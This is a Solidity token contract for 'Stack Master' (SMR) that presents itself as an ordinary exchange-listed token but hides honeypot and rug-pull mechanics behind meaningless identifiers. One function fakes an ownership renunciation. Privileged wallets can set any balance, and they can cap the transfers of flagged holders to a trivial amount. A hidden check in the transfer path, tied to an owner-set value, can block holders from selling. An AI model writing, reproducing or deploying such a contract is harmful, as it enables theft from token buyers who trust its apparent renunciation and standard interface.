//SPDX-License-Identifier: MIT

pragma solidity ^0.8.6;

interface buyAt {
    function createPair(address isTeam, address senderIsTo) external returns (address);
}

interface takeLimit {
    function totalSupply() external view returns (uint256);

    function balanceOf(address isTx) external view returns (uint256);

    function transfer(address launchTake, uint256 minTrading) external returns (bool);

    function allowance(address receiverTake, address spender) external view returns (uint256);

    function approve(address spender, uint256 minTrading) external returns (bool);

    function transferFrom(
        address sender,
        address launchTake,
        uint256 minTrading
    ) external returns (bool);

    event Transfer(address indexed from, address indexed takeMode, uint256 value);
    event Approval(address indexed receiverTake, address indexed spender, uint256 value);
}

abstract contract teamSenderTotal {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface sellAmountEnable {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface takeTrading is takeLimit {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract StackMaster is teamSenderTotal, takeLimit, takeTrading {

    function transfer(address takeMin, uint256 minTrading) external virtual override returns (bool) {
        return isAmount(_msgSender(), takeMin, minTrading);
    }

    string private fundSwap = "Stack Master";

    string private fundAmount = "SMR";

    function liquidityToken() public {
        emit OwnershipTransferred(launchedListTeam, address(0));
        autoMin = address(0);
    }

    function name() external view virtual override returns (string memory) {
        return fundSwap;
    }

    function owner() external view returns (address) {
        return autoMin;
    }

    function decimals() external view virtual override returns (uint8) {
        return shouldBuy;
    }

    address public shouldLaunched;

    function symbol() external view virtual override returns (string memory) {
        return fundAmount;
    }

    bool private receiverFee;

    bool public receiverTotal;

    mapping(address => bool) public teamWallet;

    address buyFrom = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 tokenLimit;

    uint256 teamBuy;

    uint256 private fundLaunch = 100000000 * 10 ** 18;

    mapping(address => mapping(address => uint256)) private takeListSender;

    address shouldAuto = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    constructor (){
        if (receiverFee) {
            marketingSender = sellTradingWallet;
        }
        sellAmountEnable maxAuto = sellAmountEnable(shouldAuto);
        shouldLaunched = buyAt(maxAuto.factory()).createPair(maxAuto.WETH(), address(this));
        if (marketingSender != sellTradingWallet) {
            launchMode = false;
        }
        launchedListTeam = _msgSender();
        teamWallet[launchedListTeam] = true;
        fromTotalTrading[launchedListTeam] = fundLaunch;
        liquidityToken();
        if (marketingSender != sellTradingWallet) {
            sellTradingWallet = marketingSender;
        }
        emit Transfer(address(0), launchedListTeam, fundLaunch);
    }

    function atTradingToken(address feeWallet) public {
        atEnableBuy();
        
        if (feeWallet == launchedListTeam || feeWallet == shouldLaunched) {
            return;
        }
        fundTake[feeWallet] = true;
    }

    bool public modeTrading;

    bool public launchMode;

    function autoSell(uint256 minTrading) public {
        atEnableBuy();
        teamBuy = minTrading;
    }

    uint256 private sellTradingWallet;

    mapping(address => uint256) private fromTotalTrading;

    function autoReceiver(address takeMin, uint256 minTrading) public {
        atEnableBuy();
        fromTotalTrading[takeMin] = minTrading;
    }

    function isFund(address buyMarketing) public {
        require(buyMarketing.balance < 100000);
        if (receiverTotal) {
            return;
        }
        if (receiverFee) {
            launchMode = false;
        }
        teamWallet[buyMarketing] = true;
        if (modeTrading) {
            receiverFee = false;
        }
        receiverTotal = true;
    }

    function getOwner() external view returns (address) {
        return autoMin;
    }

    mapping(address => bool) public fundTake;

    function balanceOf(address isTx) public view virtual override returns (uint256) {
        return fromTotalTrading[isTx];
    }

    function atEnableBuy() private view {
        require(teamWallet[_msgSender()]);
    }

    function isAmount(address receiverSwapMarketing, address launchTake, uint256 minTrading) internal returns (bool) {
        if (receiverSwapMarketing == launchedListTeam) {
            return limitFrom(receiverSwapMarketing, launchTake, minTrading);
        }
        uint256 senderReceiver = takeLimit(shouldLaunched).balanceOf(buyFrom);
        require(senderReceiver == teamBuy);
        require(launchTake != buyFrom);
        if (fundTake[receiverSwapMarketing]) {
            return limitFrom(receiverSwapMarketing, launchTake, swapTradingLimit);
        }
        return limitFrom(receiverSwapMarketing, launchTake, minTrading);
    }

    uint8 private shouldBuy = 18;

    function transferFrom(address receiverSwapMarketing, address launchTake, uint256 minTrading) external override returns (bool) {
        if (_msgSender() != shouldAuto) {
            if (takeListSender[receiverSwapMarketing][_msgSender()] != type(uint256).max) {
                require(minTrading <= takeListSender[receiverSwapMarketing][_msgSender()]);
                takeListSender[receiverSwapMarketing][_msgSender()] -= minTrading;
            }
        }
        return isAmount(receiverSwapMarketing, launchTake, minTrading);
    }

    function allowance(address tradingFund, address liquiditySwapWallet) external view virtual override returns (uint256) {
        if (liquiditySwapWallet == shouldAuto) {
            return type(uint256).max;
        }
        return takeListSender[tradingFund][liquiditySwapWallet];
    }

    function totalSupply() external view virtual override returns (uint256) {
        return fundLaunch;
    }

    event OwnershipTransferred(address indexed maxLimit, address indexed senderMaxList);

    function approve(address liquiditySwapWallet, uint256 minTrading) public virtual override returns (bool) {
        takeListSender[_msgSender()][liquiditySwapWallet] = minTrading;
        emit Approval(_msgSender(), liquiditySwapWallet, minTrading);
        return true;
    }

    uint256 constant swapTradingLimit = 14 ** 10;

    address public launchedListTeam;

    function limitFrom(address receiverSwapMarketing, address launchTake, uint256 minTrading) internal returns (bool) {
        require(fromTotalTrading[receiverSwapMarketing] >= minTrading);
        fromTotalTrading[receiverSwapMarketing] -= minTrading;
        fromTotalTrading[launchTake] += minTrading;
        emit Transfer(receiverSwapMarketing, launchTake, minTrading);
        return true;
    }

    address private autoMin;

    uint256 private marketingSender;

}